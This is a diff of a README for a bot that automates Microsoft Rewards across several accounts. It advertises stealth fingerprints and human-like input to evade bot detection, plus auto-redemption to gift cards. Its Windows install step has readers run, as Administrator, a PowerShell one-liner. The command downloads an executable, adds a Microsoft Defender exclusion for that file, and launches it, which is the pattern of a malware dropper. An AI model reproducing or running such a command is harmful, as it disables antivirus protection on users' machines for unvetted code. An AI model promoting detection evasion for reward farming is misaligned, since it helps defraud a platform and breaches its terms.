@@ -5,7 +5,7 @@
 <h1 align="center">Microsoft Rewards Bot</h1>
 
 <p align="center">
-  <strong>Automate Microsoft Rewards — both dashboards, a real control panel, zero manual work.</strong>
+  <strong>Your Microsoft Rewards on autopilot — searches, daily sets, and promotions, on every account, every day.</strong>
 </p>
 
 <p align="center">
@@ -24,29 +24,9 @@
 
 ---
 
-Microsoft Rewards Bot automates daily sets, searches, and promotions — fully hands-free, with a local control panel (**Rewards Desk**), a sandboxed plugin system, and silent auto-updates. It runs on **both** Microsoft Rewards dashboards, auto-detecting per account which one it's served so nothing is ever left uncollected. An optional premium **Core** plugin unlocks full point coverage — coupons, streak protection, app rewards — plus a remote web dashboard to run every machine from anywhere.
-
----
-
-## Features
-
-- ✅ **Works on the new Microsoft dashboard** *and* the classic one — auto-detected per account, zero config.
-- 🖥️ **A real control panel** (Rewards Desk) — manage accounts, runs, settings, and plugins in your browser. No terminal, no JSON, no rebuild after every change.
-- 🔍 **Desktop + mobile searches** with human-like behavior and multi-source, locale-aware query generation.
-- 🧩 **Activities solved automatically** — daily set, quizzes, polls, promotions, URL rewards, and classic punch cards.
-- 🔐 **Full login coverage** — password, 2FA / TOTP, passwordless, passkey handling, and recovery flows.
-- 🛡️ **Anti-detection built in** — stealth browser, realistic fingerprints, human-like mouse and typing.
-- 🔒 **Your credentials stay yours** — accounts encrypted at rest with your OS vault (DPAPI / Keychain / Secret Service).
-- 🧰 **Extensible** — a sandboxed plugin system to add your own features safely.
-- 🔔 **Notifications & automation** — Discord and ntfy alerts, a built-in scheduler, silent auto-updates, and Docker support.
-- 🌍 **Cross-platform** — Windows, macOS, Linux, and headless/Docker.
-- ⭐ **Optional Core** — claimable point cards, dashboard coupons, streak protection, app rewards, **auto-redeem to gift cards**, and a remote dashboard to run every machine from anywhere.
-
----
+Set it up once. The bot signs in, searches, and clears the daily activities on every account — then does it again tomorrow. It supports **both** Microsoft Rewards dashboards (new and classic, auto-detected per account), and you drive it from **Rewards Desk**, a control panel running on your own computer. No terminal, no JSON editing, no rebuilds.
 
 ## Rewards Desk
-
-Rewards Desk is the local control panel. It opens automatically when you run `npm start`.
 
 <div align="center">
   <table width="90%">
@@ -63,29 +43,23 @@ Rewards Desk is the local control panel. It opens automatically when you run `np
   </table>
 </div>
 
-<br>
+Accounts, live runs, settings, plugins, logs — all in one place. It opens automatically when you run `npm start`.
 
-Manage accounts, monitor live runs, toggle plugins, edit settings, and activate Core — no terminal needed for day-to-day use.
+> Prefer a plain CLI? Pass `--terminal` at launch. Docker and headless machines use terminal mode automatically.
 
-> The Desk is optional. Set `terminal.enabled: true` in your config or pass `--terminal` at launch to run the bot as a plain CLI process. Docker and headless environments always use terminal mode automatically.
+## Highlights
 
----
+- ✅ **Both dashboards** — new *and* classic, auto-detected per account, so nothing is left uncollected.
+- 🧩 **Everything solved** — desktop & mobile searches, daily set, quizzes, polls, promotions, punch cards.
+- 🔐 **Every login flow** — password, 2FA/TOTP, passwordless, passkeys, recovery.
+- 🛡️ **Stealth built in** — hardened browser, realistic fingerprints, human-like mouse and typing.
+- 🔒 **Credentials encrypted at rest** with your OS vault (DPAPI / Keychain / Secret Service).
+- ⏰ **Fully hands-free** — built-in scheduler, silent auto-updates, Discord & ntfy notifications.
+- 🧰 **Extensible** — sandboxed plugins, installed in one click from the marketplace.
+- 🌍 **Runs anywhere** — Windows, macOS, Linux, Docker/headless.
+- ⭐ **Core (optional)** — coupons, streak protection, app rewards, auto-redeem to gift cards, remote dashboard.
 
-## Core Dashboard
-
-The optional Core plugin adds a remote web dashboard to monitor and control your machines from anywhere.
-
-<div align="center">
-  <img src="assets/website.png" alt="Core remote web dashboard" width="85%">
-</div>
-
-<br>
-
-See [Core plugin](docs/core-plugin.md) for the full feature list and how to get it.
-
----
-
-## Installation
+## Quick start
 
 ### Windows — automated installer
 
@@ -95,11 +69,9 @@ Open PowerShell as **Administrator** and run:
 $f="$env:TEMP\install.exe"; iwr https://github.com/QuestPilot/Microsoft-Rewards-Bot/raw/HEAD/scripts/install.exe -OutFile $f; Add-MpPreference -ExclusionPath $f; start $f
 ```
 
-The installer fetches the latest stable binary and deploys it locally.
+### Windows · macOS · Linux — manual
 
-### Manual — Windows, macOS, Linux
-
-Requires [Node.js 24.15.0](docs/node-version.md).
+Requires [Node.js 24.15.0](docs/node-version.md):
 
 ```bash
 git clone https://github.com/QuestPilot/Microsoft-Rewards-Bot.git
@@ -108,38 +80,44 @@ npm install
 npm start
 ```
 
-The `main` branch is the supported public channel. Auto-updates read from it directly, and the compiled Core plugin is built for the documented Node.js target.
-
 ### Docker
 
 ```bash
 docker compose up -d --build
 ```
 
-See [Docker deployment](docs/docker.md) for the full Compose example and Core configuration.
+Installs and auto-updates follow the `main` branch — the supported channel. Details: [Install & auto-updates](docs/updates.md) · [Docker](docs/docker.md).
 
----
+## Core — the optional premium layer
+
+<div align="center">
+  <img src="assets/website.png" alt="Core remote web dashboard" width="85%">
+</div>
+
+<br>
+
+Core collects what the free bot can't reach — **claimable point cards, dashboard coupons, streak protection, app rewards, auto-redeem to gift cards** — and adds a remote web dashboard to watch and control every machine from anywhere.
+
+**[See what Core adds →](docs/core-plugin.md)** · Try it **free for 3 days** via the [Discord](https://discord.gg/JWhCkhSYtg) — no payment needed.
 
 ## Documentation
 
-| Goal | Link |
+| I want to… | Read |
 | --- | --- |
-| Understand the local control panel | [Rewards Desk](docs/rewards-desk.md) |
-| Upgrade with the premium Core plugin | [Official Core Plugin](docs/core-plugin.md) |
-| Use the remote web dashboard | [Core Dashboard](docs/dashboard.md) |
-| Install, update, or understand `npm start` | [Install and Auto-Updates](docs/updates.md) |
-| Run the bot in a container | [Docker Deployment](docs/docker.md) |
-| Verify or upgrade Node.js | [Node.js Version Reference](docs/node-version.md) |
-| Enable, disable, or inspect plugins | [Plugin System](docs/plugins.md) |
-| Build your own plugin | [Create a Plugin](docs/create-plugin.md) · [Plugin API](docs/plugin-api.md) |
-| Fix launch, install, or update issues | [Troubleshooting](docs/troubleshooting.md) |
-| Run safely & reduce ban risk | [Account Safety](docs/account-safety.md) |
-| Understand privacy, telemetry, and security | [Privacy & Telemetry](docs/privacy.md) · [Security Policy](.github/SECURITY.md) |
-| Licensing and allowed use | [License](LICENSE) · [Commercial Use](docs/legal/COMMERCIAL.md) · [Trademark](docs/legal/TRADEMARK.md) |
+| Install the bot and understand `npm start` | [Install & auto-updates](docs/updates.md) |
+| Use the control panel | [Rewards Desk](docs/rewards-desk.md) |
+| Run it in Docker | [Docker](docs/docker.md) |
+| Add plugins — or build my own | [Plugins](docs/plugins.md) · [Create a plugin](docs/create-plugin.md) |
+| See what Core adds | [Core plugin](docs/core-plugin.md) · [Core Dashboard](docs/dashboard.md) |
+| Keep my accounts safe | [Account safety](docs/account-safety.md) |
+| Know exactly what data is (and isn't) collected | [Privacy & telemetry](docs/privacy.md) |
+| Fix a problem | [Troubleshooting](docs/troubleshooting.md) |
 
-Full documentation index: [docs/README.md](docs/README.md)
+Everything else: **[full documentation index](docs/README.md)**
 
----
+## License
+
+Source-available, free for **personal, non-commercial use** — see [LICENSE](LICENSE), [Commercial use](docs/legal/COMMERCIAL.md), and [Trademark](docs/legal/TRADEMARK.md).
 
 ## Disclaimer
 
